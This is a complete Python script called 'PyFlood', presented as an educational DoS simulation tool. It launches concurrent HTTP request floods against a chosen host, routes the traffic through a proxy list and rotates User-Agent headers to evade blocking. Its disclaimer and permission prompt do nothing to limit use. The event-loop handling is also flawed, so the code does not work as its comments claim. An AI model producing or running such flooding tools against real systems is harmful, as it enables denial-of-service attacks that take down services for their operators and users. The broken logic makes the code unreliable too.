import argparse
import logging
import random
import threading
import time
import asyncio
import aiohttp
from aiohttp import ClientSession

# Color codes for hacker theme
GREEN = '\033[32m'
RED = '\033[31m'
CYAN = '\033[36m'
RESET = '\033[0m'

# Display disclaimer and ASCII art
print(GREEN + """
DISCLAIMER: This tool is for educational purposes only. 
Use it only in controlled environments with explicit permission. 
Unauthorized use is illegal and unethical.

 ~~~~~ 
~     ~
 ~   ~
  ~ ~
   ~
""" + RESET)

# Parse command-line arguments
parser = argparse.ArgumentParser(
    description="PyFlood - Advanced DoS Simulation Tool for Ethical Hacking",
    epilog="Example: python pyflood.py --target 127.0.0.1 --port 80 --threads 5 --proxies proxies.txt --rate 50 --duration 60 --method GET --https"
)
parser.add_argument("--target", required=True, help="Target IP address or domain")
parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
parser.add_argument("--proxies", help="File with proxy list (host:port per line)")
parser.add_argument("--rate", type=int, default=100, help="Requests per second per thread (default: 100)")
parser.add_argument("--duration", type=int, help="Duration of the attack in seconds")
parser.add_argument("--method", choices=["GET", "POST", "HEAD"], default="GET", help="HTTP method (default: GET)")
parser.add_argument("--https", action="store_true", help="Use HTTPS (default: HTTP)")
args = parser.parse_args()

# Confirm permission
print(RED + f"Do you have permission to test {args.target}? (yes/no): " + RESET, end='')
confirm = input().strip().lower()
if confirm != "yes":
    print(RED + "Aborting - Permission not granted or invalid input." + RESET)
    exit()
print(GREEN + "Permission granted. Proceeding with simulation." + RESET)

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("pyflood.log"),
        logging.StreamHandler()
    ]
)

# Load proxies from file (if provided)
proxy_list = []
if args.proxies:
    try:
        with open(args.proxies, "r") as f:
            proxy_list = [line.strip() for line in f if line.strip()]
        logging.info(f"Loaded {len(proxy_list)} proxies from {args.proxies}")
    except FileNotFoundError:
        logging.error(f"Proxy file {args.proxies} not found.")
        exit()

# List of User-Agents for randomization
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",
]

# Global variables for request counter and thread control
request_counter = 0
counter_lock = threading.Lock()
stop_event = threading.Event()

# Asynchronous HTTP flood function
async def async_http_flood(session, target_url, method, headers, proxy=None):
    try:
        proxy_url = f"http://{proxy}" if proxy else None
        if method == "POST":
            response = await session.post(target_url, headers=headers, proxy=proxy_url)
        elif method == "HEAD":
            response = await session.head(target_url, headers=headers, proxy=proxy_url)
        else:
            response = await session.get(target_url, headers=headers, proxy=proxy_url)
        logging.info(f"Response from {target_url} - {response.status}")
        return 1
    except Exception as e:
        logging.error(f"Error in async HTTP flood: {e}")
        return 0

# Attack worker function
async def attack_worker(target_url, proxy_list, rate, method):
    async with ClientSession() as session:
        while not stop_event.is_set():
            try:
                proxy = random.choice(proxy_list) if proxy_list else None
                headers = {
                    "User-Agent": random.choice(user_agents),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Connection": "keep-alive"
                }
                success = await async_http_flood(session, target_url, method, headers, proxy)
                with counter_lock:
                    global request_counter
                    request_counter += success
                await asyncio.sleep(1 / rate)  # Control request rate
            except Exception as e:
                logging.error(f"Worker error: {e}")
                await asyncio.sleep(1)  # Brief pause on error

# Main function to start the attack
async def start_attack(target_url, proxy_list, rate, method, threads):
    tasks = []
    for _ in range(threads):
        task = asyncio.create_task(attack_worker(target_url, proxy_list, rate, method))
        tasks.append(task)
    await asyncio.gather(*tasks)

# Main execution
try:
    start_time = time.time()
    target_url = f"{'https' if args.https else 'http'}://{args.target}:{args.port}/"
    logging.info(f"Starting PyFlood simulation on {target_url} with {args.threads} threads")
    
    loop = asyncio.get_event_loop()
    attack_task = loop.create_task(start_attack(target_url, proxy_list, args.rate, args.method, args.threads))
    
    while not stop_event.is_set():
        if args.duration and time.time() - start_time > args.duration:
            stop_event.set()
        with counter_lock:
            count = request_counter
        elapsed = time.time() - start_time
        rate = count / elapsed if elapsed > 0 else 0
        print(CYAN + f"\rRequests sent: {count}, Elapsed time: {elapsed:.2f}s, Rate: {rate:.2f} req/s" + RESET, end='')
        time.sleep(1)

except KeyboardInterrupt:
    stop_event.set()
finally:
    loop.run_until_complete(attack_task)
    with counter_lock:
        count = request_counter
    elapsed = time.time() - start_time
    rate = count / elapsed if elapsed > 0 else 0
    print(GREEN + f"\nSimulation terminated. Total requests sent: {count}, Total time: {elapsed:.2f}s, Average rate: {rate:.2f} req/s" + RESET)